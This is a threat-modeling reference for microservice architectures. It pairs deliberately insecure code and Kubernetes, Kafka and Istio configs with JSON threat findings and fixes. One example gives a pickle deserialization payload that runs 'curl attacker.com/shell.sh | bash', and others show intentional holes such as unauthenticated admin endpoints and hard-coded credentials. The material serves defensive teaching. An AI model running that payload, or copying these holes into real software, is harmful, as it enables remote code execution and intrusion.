# Microservices Threat Modeling Examples

Real-world threat scenarios for distributed microservice architectures.

## Service-to-Service Communication Examples

### Example 1: HTTP Between Internal Services

**Vulnerable Code:**
```python
# payment-service/app.py
import requests

def process_payment(order_id):
    # VULNERABLE: HTTP to internal service, no auth
    order = requests.get(f'http://order-service:8080/orders/{order_id}').json()
    # Process payment...
```

**Attack Scenario:**
Attacker with network access intercepts payment data or spoofs order-service responses.

**Threat Output:**
```json
{
  "id": "THREAT-001",
  "category": "Tampering",
  "title": "Unencrypted Service-to-Service Communication",
  "description": "Payment service communicates with order service over HTTP without TLS, allowing network attackers to intercept or modify payment data",
  "severity": "critical",
  "affected_components": ["payment-service", "order-service", "internal network"],
  "attack_scenario": "Attacker on cluster network performs MITM to modify order amounts or intercept credit card data",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-319", "CWE-300"],
  "mitigation": "Enable Istio strict mTLS, use service mesh for all inter-service communication"
}
```

### Example 2: No Service Identity Verification

**Vulnerable Code:**
```python
# Internal API trusts any caller
@app.route('/internal/admin/delete-user/<user_id>', methods=['DELETE'])
def delete_user(user_id):
    # VULNERABLE: No authentication for internal endpoint
    User.query.filter_by(id=user_id).delete()
    return jsonify({'status': 'deleted'})
```

**Attack:**
Any compromised service or container can call admin endpoints.

---

## Container Security Examples

### Example 3: Container Running as Root

**Vulnerable Kubernetes Manifest:**
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        # VULNERABLE: No security context, runs as root
```

**Threat Output:**
```json
{
  "id": "THREAT-002",
  "category": "Elevation of Privilege",
  "title": "Container Running as Root Without Security Context",
  "description": "Web application container runs as root user with no read-only filesystem, increasing container escape and lateral movement risk if compromised",
  "severity": "high",
  "affected_components": ["Deployment/web-app", "container runtime"],
  "attack_scenario": "Attacker exploits application vulnerability, gains root in container, writes to filesystem, potentially escapes to host",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-250", "CWE-269"],
  "mitigation": "Add securityContext: runAsNonRoot: true, runAsUser: 1000, readOnlyRootFilesystem: true"
}
```

**Fixed Version:**
```yaml
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        fsGroup: 1000
      containers:
      - name: app
        image: myapp:v1.2.3  # Pinned version
        securityContext:
          runAsUser: 1000
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
        resources:
          limits:
            memory: "256Mi"
            cpu: "500m"
```

### Example 4: Privileged Container

**Vulnerable:**
```yaml
containers:
- name: app
  image: myapp
  securityContext:
    privileged: true  # VULNERABLE: Full host access!
```

**Threat:**
Container has full access to host kernel, can escape trivially.

---

## Secrets Management Examples

### Example 5: Secrets in ConfigMap

**Vulnerable:**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  DATABASE_URL: "postgres://admin:secretpassword123@db:5432/app"  # VULNERABLE!
  API_KEY: "sk-live-abc123xyz"  # VULNERABLE!
```

**Threat Output:**
```json
{
  "id": "THREAT-003",
  "category": "Information Disclosure",
  "title": "Database Credentials Stored in ConfigMap",
  "description": "Database password and API key stored in plaintext ConfigMap, accessible to anyone with namespace read access",
  "severity": "high",
  "affected_components": ["ConfigMap/app-config", "database", "third-party API"],
  "attack_scenario": "Developer or compromised service account reads ConfigMap, extracts credentials for database access",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-312", "CWE-522"],
  "mitigation": "Move to Kubernetes Secret with encryption at rest, or use external secrets manager (Vault, AWS Secrets Manager)"
}
```

**Fixed Version:**
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  DATABASE_URL: cG9zdGdyZXM6Ly9hZG1pbjpzZWNyZXRwYXNzd29yZDEyM0BkYjogNTQzMi9hcHA=
  API_KEY: c2stbGl2ZS1hYmMxMjN4eXo=
```

### Example 6: Secrets in Docker Image

**Vulnerable Dockerfile:**
```dockerfile
FROM python:3.11

# VULNERABLE: Secrets baked into image
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

COPY . /app
RUN pip install -r requirements.txt
```

**Attack:**
Anyone with image access (registry breach, internal access) gets AWS credentials.

---

## API Gateway Examples

### Example 7: Service Exposed Without Gateway

**Vulnerable:**
```yaml
apiVersion: v1
kind: Service
metadata:
  name: payment-api
spec:
  type: LoadBalancer  # VULNERABLE: Direct external exposure
  ports:
  - port: 80
  selector:
    app: payment
```

**Threat Output:**
```json
{
  "id": "THREAT-004",
  "category": "Elevation of Privilege",
  "title": "Internal Service Directly Exposed to Internet",
  "description": "Payment API exposed via LoadBalancer type, bypassing API gateway authentication, rate limiting, and WAF protections",
  "severity": "critical",
  "affected_components": ["Service/payment-api", "Payment deployment"],
  "attack_scenario": "Attacker directly accesses payment API, bypasses authentication and rate limiting that would be enforced at gateway",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-284", "CWE-306"],
  "mitigation": "Change to ClusterIP, route through Ingress with auth middleware"
}
```

---

## Message Queue Examples

### Example 8: Unauthenticated Kafka Access

**Vulnerable Configuration:**
```properties
# kafka/server.properties
# VULNERABLE: No authentication
listeners=PLAINTEXT://0.0.0.0:9092
```

**Attack:**
Anyone on network can produce/consume messages from any topic.

**Threat Output:**
```json
{
  "id": "THREAT-005",
  "category": "Tampering",
  "title": "Kafka Cluster Without Authentication",
  "description": "Kafka brokers accept connections without SASL authentication, allowing any network client to produce or consume messages",
  "severity": "critical",
  "affected_components": ["Kafka cluster", "all topics", "all consumers"],
  "attack_scenario": "Attacker produces malicious messages to payment-events topic, causing downstream services to process fraudulent transactions",
  "infrastructure_type": "kafka",
  "vulnerability_types": ["CWE-306", "CWE-287"],
  "mitigation": "Enable SASL_SSL authentication, configure per-topic ACLs"
}
```

### Example 9: Deserialization on Queue Messages

**Vulnerable Code:**
```python
# consumer.py
import pickle

def process_message(message):
    # VULNERABLE: Deserializing untrusted data
    task = pickle.loads(message.value)
    task.execute()
```

**Attack Payload:**
```python
class RCE:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))
```

---

## Service Mesh Examples

### Example 10: Permissive mTLS Mode

**Vulnerable:**
```yaml
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: PERMISSIVE  # VULNERABLE: Allows plaintext
```

**Threat Output:**
```json
{
  "id": "THREAT-006",
  "category": "Information Disclosure",
  "title": "Istio mTLS in Permissive Mode Allows Unencrypted Traffic",
  "description": "Service mesh configured with PERMISSIVE mTLS mode, accepting both encrypted and plaintext traffic, nullifying encryption benefits",
  "severity": "high",
  "affected_components": ["Istio mesh", "production namespace", "all services"],
  "attack_scenario": "Attacker on network sends plaintext requests to services, bypassing mTLS and intercepting responses",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-319"],
  "mitigation": "Set mtls.mode: STRICT for all namespaces"
}
```

### Example 11: Missing Authorization Policy

**Secure Example:**
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-policy
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/production/sa/order-service"]
    to:
    - operation:
        methods: ["POST"]
        paths: ["/api/payments"]
```

---

## RBAC Examples

### Example 12: Overly Permissive ClusterRole

**Vulnerable:**
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: developer
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]  # VULNERABLE: God mode!
```

**Threat Output:**
```json
{
  "id": "THREAT-007",
  "category": "Elevation of Privilege",
  "title": "ClusterRole Grants Unrestricted Cluster Access",
  "description": "Developer ClusterRole uses wildcards for all apiGroups, resources, and verbs, effectively granting cluster-admin privileges",
  "severity": "critical",
  "affected_components": ["ClusterRole/developer", "all cluster resources"],
  "attack_scenario": "Compromised developer credentials used to access secrets, modify deployments, or delete critical resources",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-250", "CWE-269"],
  "mitigation": "Apply least privilege: specify exact apiGroups, resources, and verbs needed"
}
```

---

## CI/CD Pipeline Examples

### Example 13: Unsigned Container Images

**Vulnerable:**
```yaml
# deployment.yaml
containers:
- name: app
  image: myregistry.io/myapp:latest  # VULNERABLE: Mutable tag, no signing
```

**Threat Output:**
```json
{
  "id": "THREAT-008",
  "category": "Tampering",
  "title": "Container Images Without Signature Verification",
  "description": "Deployments use mutable :latest tags and no image signature verification, allowing supply chain attacks via registry compromise",
  "severity": "high",
  "affected_components": ["all Deployments", "container registry", "CI/CD pipeline"],
  "attack_scenario": "Attacker compromises registry, replaces :latest with malicious image, next pod restart pulls backdoored container",
  "infrastructure_type": "kubernetes",
  "vulnerability_types": ["CWE-494", "CWE-829"],
  "mitigation": "Use immutable image digests (sha256:...), implement Cosign/Notary signing, add admission controller to verify signatures"
}
```

**Fixed:**
```yaml
containers:
- name: app
  image: myregistry.io/myapp@sha256:abc123def456...  # Immutable digest
```

